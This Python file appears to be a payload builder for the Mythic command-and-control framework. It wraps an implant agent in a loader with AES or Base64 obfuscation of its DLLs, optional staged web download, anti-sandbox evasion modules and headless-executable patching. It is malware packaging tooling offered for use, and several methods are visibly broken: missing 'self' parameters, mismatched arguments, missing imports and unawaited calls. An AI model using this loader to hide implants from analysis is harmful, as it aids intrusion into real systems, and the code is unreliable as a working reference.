from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from distutils.dir_util import copy_tree
import asyncio
import os
import sys
import shutil
import tempfile
import traceback
import subprocess
import json
import pefile
import io
import zipfile
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

# define your payload type class here, it must extend the PayloadType class though
class aegis(PayloadType):
    name = "aegis"  # name that would show up in the UI
    file_extension = "zip"  # default file extension to use when creating payloads
    author = "@checkymander"  # author of the payload type
    supported_os = [
        SupportedOS.Windows,
        SupportedOS.Linux,
        SupportedOS.MacOS,
    ]  # supported OS and architecture combos
    wrapper = True  # does this payload type act as a wrapper for another payloads inside of it?
    wrapped_payloads = ["athena"]  # if so, which payload types. If you are writing a wrapper, you will need to modify this variable (adding in your wrapper's name) in the builder.py of each payload that you want to utilize your wrapper.
    note = """Protect your goddess"""
    supports_dynamic_loading = True  # setting this to True allows users to only select a subset of commands when generating a payload
    agent_path = pathlib.Path(".") / "aegis" / "mythic"
    agent_code_path = pathlib.Path(".") / "aegis"  / "agent_code" / "Aegis"
    agent_icon_path = agent_path / "agent_functions" / "aegis.svg"
    build_steps = [
        BuildStep(step_name="Precheck", step_description="Chacking Agent Build Config"),
        BuildStep(step_name="Gathering DLLs", step_description="Getting Agent DLLs"),
        BuildStep(step_name="Obfuscating DLLs", step_description="Obfuscating DLLs for storage"),
        BuildStep(step_name="Configure Loader", step_description="Configuring The Loader"),
        BuildStep(step_name="Compile", step_description="Compiling final executable"),
        BuildStep(step_name="Zip", step_description="Zipping final payload"),
    ]
    build_parameters = [
        BuildParameter(
            name="loader-type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["unstaged", "staged-web"],
            default_value="unstaged",
            description="Make use of a staged or unstaged payload"
        ),
        BuildParameter(
            name="url",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="(Staged Only) Url to pull loader payload from"
        ),
        BuildParameter(
            name="obfuscation-type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["Plaintext", "Aes", "Base64"],
            default_value="Plaintext",
            description="Obfuscation to apply to agent files before load"
        ),
        BuildParameter(
            name="sandbox-evasion",
            parameter_type=BuildParameterType.ChooseMultiple,
            choices = ["delay-execution", "calculate-pi", "domain-lookup"],
            default_value=[],
            description="Add anti-sandbox evasions to the loader"
        ), 
        BuildParameter(
            name="output-type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["binary", 
                    #"app bundle"
                    ],
            default_value="binary",
            description="Compile the payload or provide the raw source code"
        )
    ]

    async def prepareWinExe(self, output_path, agent_type):
        agent_exe = "{}.exe".format(agent_type)
        pe = pefile.PE(os.path.join(output_path, agent_exe))
        pe.OPTIONAL_HEADER.Subsystem = 2
        pe.write(os.path.join(output_path, "Aegis_Headless.exe"))
        pe.close()
        os.remove(os.path.join(output_path, agent_exe))
        os.rename(os.path.join(output_path, "Aegis_Headless.exe"), os.path.join(output_path, agent_exe))
    
    # These could be combined but that's a later problem.
    def addLoader(self, agent_build_path, obfuscation_type, agent_type):
        project_path = os.path.join(agent_build_path.name, "Aegis.Loader.{}".format(obfuscation_type), "Aegis.Loader.{}.csproj".format(obfuscation_type))
        p = subprocess.Popen(["dotnet", "add", agent_type, "reference", project_path], cwd=agent_build_path.name)
        p.wait()

    async def encrypt_file(input_file_path, output_file_path, key_str):
        """
        Encrypts a file using AES encryption.

        Args:
            input_file_path (str): Path to the file to encrypt.
            output_file_path (str): Path to save the encrypted file.
            key (bytes): Encryption key (must be 16, 24, or 32 bytes long).
        """
        key = key_str.encode('utf-8')
        if len(key) not in [16, 24, 32]:
            raise ValueError("Key must be 16, 24, or 32 bytes long.")

        # Generate a random IV
        iv = os.urandom(16)

        # Create the cipher
        cipher = AES.new(key, AES.MODE_CBC, iv)

        with open(input_file_path, 'rb') as f:
            plaintext = f.read()

        # Pad the plaintext and encrypt
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

        # Write the IV and ciphertext to the output file
        with open(output_file_path, 'wb') as f:
            f.write(iv + ciphertext)
    
    async def encode_file(input_file_path, output_file_path):
        """
        Encodes a file's content with Base64 encoding.

        Args:
            input_file_path (str): Path to the file to encode.
            output_file_path (str): Path to save the Base64 encoded file.
        """
        with open(input_file_path, 'rb') as input_file:
            # Read the file's binary content
            file_content = input_file.read()

        # Encode the content in Base64
        encoded_content = base64.b64encode(file_content)
        encoded_content = encoded_content.encode('utf-8')
        with open(output_file_path, 'wb') as output_file:
            # Write the Base64 encoded content to the output file
            output_file.write(encoded_content)
        
# Example usage
# encrypt_file('example.txt', 'encrypted.bin', b'mysecretkey123456'

    async def encryptDlls(self, agent_build_path, key):
        dll_files = self.getAgentDlls(agent_build_path)
        self.update_placeholder(agent_build_path,"Aegis.Loader.Aes", key)
        await asyncio.gather(*[self.encrypt_file(os.path.join(agent_build_path,"AgentFiles",i), os.path.join(agent_build_path,"AgentFiles",i.replace("dll","bin"), key)) for i in dll_files])

    async def encodeDlls(self, agent_build_path):
        dll_files = self.getAgentDlls(agent_build_path)
        await asyncio.gather(*[self.encode_file(os.path.join(agent_build_path,"AgentFiles",i), os.path.join(agent_build_path,"AgentFiles",i.replace("dll","b64"))) for i in dll_files])

    async def update_placeholder(self, agent_build_path, project, key):
        baseFile = open(f"{agent_build_path.name}/{project}/AgentLoader.cs", "r").read()
        baseFile = baseFile.replace("%UUID%", key)
        with open(f"{agent_build_path.name}/{project}/AgentLoader.cs", "w") as f:
            f.write(baseFile)  

    def getAgentDlls(self, agent_build_path, obfuscated_assembly_name) -> list[str]:
        dll_files = []
        # Iterate over files in the directory
        for filename in os.listdir(os.path.join(agent_build_path,"AgentFiles")):
            # Check if the file has a .dll extension
            if filename.lower().endswith('.dll'):
                if obfuscated_assembly_name in filename:
                    os.rename(os.path.join(agent_build_path,"AgentFiles",f"{obfuscated_assembly_name}.dll"), os.path.join(agent_build_path,"AgentFiles","Agent.dll"))
                    dll_files.append("Agent.dll")
                else:                    
                    # Add the DLL file path to the array
                    dll_files.append(filename)
        return dll_files
    
    def addEvasion(self, agent_build_path, profile, payload):
        project_path = os.path.join(agent_build_path.name, "Aegis.Mods.{}".format(profile), "Aegis.Mods.{}.csproj".format(profile))
        p = subprocess.Popen(["dotnet", "add", payload, "reference", project_path], cwd=agent_build_path.name)
        p.wait()
        
    async def returnSuccess(self, resp: BuildResponse, build_msg, agent_build_path) -> BuildResponse:
        resp.status = BuildStatus.Success
        resp.build_message = build_msg
        resp.payload = open(f"{agent_build_path.name}/output.zip", 'rb').read()
        return resp     
    
    async def returnFailure(self, resp: BuildResponse, err_msg, build_msg) -> BuildResponse:
        resp.status = BuildStatus.Error
        resp.payload = b""
        resp.build_message = build_msg
        resp.build_stderr = err_msg
        return resp
    
    def getRid(self, selected_os, arch):
        if selected_os.upper() == "WINDOWS":
            return "win-" + arch
        elif selected_os.upper() == "LINUX":
            return "linux-" + arch
        elif selected_os.upper() == "MACOS":
                return "osx-" + arch
        elif selected_os.upper() == "REDHAT":
            return "rhel-x64"

    def getBuildCommand(self, rid, payload, configuration):
            return "dotnet publish {} -r {} -c {} --nologo --self-contained={} /p:PublishSingleFile={} /p:EnableCompressionInSingleFile={} /p:DebugType=None /p:DebugSymbols=false".format(
                payload,
                rid, 
                configuration, 
                True, 
                True, 
                True)
        
    async def build(self) -> BuildResponse:
        # self.Get_Parameter returns the values specified in the build_parameters above.
        resp = BuildResponse(status=BuildStatus.Error)    
        try:
            agent_uuid = self.wrapped_payload_uuid
            agent_payload_zip_bytes = self.wrapped_payload
            agent_type = "Aegis"
            if self.get_parameter("loader-type") == "staged-web":
                agent_type = "Aegis.Web"

            agent_search_response = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(PayloadUUID=agent_uuid))
            if not agent_search_response.Success:
                return self.returnFailure(resp, "Unable to find payload???", "Unable to find payload???")


            agent_config = agent_search_response.Payloads[0]
            agent_config_dict = {}
            for kvp in agent_config.BuildParameters:
                agent_config_dict[kvp.Name] = kvp.Value

            if agent_config_dict["single-file"] == True or agent_config_dict["self-contained"] == True:
                return self.returnFailure(resp, "Payloads should not be single-file or self-contained when using this loader.")
            
            rid = self.getRid(agent_config.SelectedOS,agent_config_dict["arch"])
            build_command = self.getBuildCommand(rid, agent_type, agent_config_dict["configuration"])
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)

            if self.get_parameter("output-type") == "app bundle":
                if agent_config.SelectedOS.upper() != "MACOS":
                    return await self.returnFailure(resp, "Error building payload: App Bundles are only supported on MacOS", "Error occurred while building payload. Check stderr for more information.")
        
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Precheck",
                StepStdout="Successfully verified Agent config",
                StepSuccess=True
            )) 
            # Copy files into the temp directory
            copy_tree(self.agent_code_path, agent_build_path.name)
            # Get Zip File from buffer
            z = zipfile.ZipFile(io.BytesIO(agent_payload_zip_bytes))

            # Unzip into our AgentFiles to be processed by 
            z.extractall(os.path.join(agent_build_path.name,"AgentFiles"))
            obfuscator_functions = {
                "plaintext": None, # We don't need to do anything, but keep it in the lib just in case
                "aes": self.encryptDlls(self.agent_code_path, self.uuid),
                "base64": self.encodeDlls(self.agent_code_path, self.uuid),
            }

            if str(self.get_parameter("obfuscation-type")).lower() is not "plaintext":
                obfuscator_functions[str(self.get_parameter("obfuscation-type")).lower()]()

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering DLLs",
                StepStdout="Successfully unzipped DLLs to " + os.path.join(agent_build_path.name,"AgentFiles"),
                StepSuccess=True
            )) 

            # Only need to add reference directly if we're using unstaged payloads, otherwise the dll will be downloaded by Aegis.Web
            if str(self.get_parameter("loader-type")).lower() == "unstaged":
                self.addLoader(agent_build_path, self.get_parameter("obfuscation-type"), agent_type)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Obfuscating DLLs",
                StepStdout="Successfully packaged required DLLs",
                StepSuccess=True
            )) 

            for evasion in self.get_parameter("sandbox-evasion"):
                self.addEvasion(agent_build_path, evasion, agent_type)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configure Loader",
                StepStdout="Successfully configured loader",
                StepSuccess=True
            ))

            if self.get_parameter("output-type") == "source":
                shutil.make_archive(f"{agent_build_path.name}/output", "zip", f"{agent_build_path.name}")
                return await self.returnSuccess(resp, "File built succesfully!", agent_build_path)
            
            output_path = "{}/{}/bin/{}/net8.0/{}/publish/".format(agent_build_path.name,agent_type,agent_config_dict["configuration"].capitalize(), rid)


            #Run command and get output
            proc = await asyncio.create_subprocess_shell(build_command, stdout=asyncio.subprocess.PIPE,
                                                         stderr=asyncio.subprocess.PIPE,
                                                         cwd=agent_build_path.name)
            output, err = await proc.communicate()
            print("stdout: " + str(output))
            print("stderr: " + str(err))
            sys.stdout.flush()
            #time.sleep(60)

            if proc.returncode != 0:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compile",
                    StepStdout="Error occurred while building payload. Check stderr for more information.",
                    StepSuccess=False
                ))

                return await self.returnFailure(resp, "Error building payload: " + str(err) + '\n' + str(output) + '\n' + build_command, "Error occurred while building payload. Check stderr for more information.")


            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compile",
                    StepStdout="Successfully compiled payload",
                    StepSuccess=True
                ))

            #If we get here, the path should exist since the build succeeded
            if self.selected_os.lower() == "windows" and self.get_parameter("configuration") != "Debug":
                #await self.prepareWinExe(output_path, agent_type) #Force it to be headless
                print("Test")

            # if self.get_parameter("output-type") == "app bundle":
            #     mac_bundler.create_app_bundle("Agent", os.path.join(output_path, "Agent"), output_path)
            #     os.remove(os.path.join(output_path, "Agent"))

            shutil.make_archive(f"{agent_build_path.name}/output", "zip", f"{output_path}")  

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Zip",
                    StepStdout="Successfully zipped payload",
                    StepSuccess=True
                ))   
            
            return await self.returnSuccess(resp, "File built succesfully!", agent_build_path)
        except:
            return await self.returnFailure(resp, str(traceback.format_exc()), "Exception in builder.py")
    
    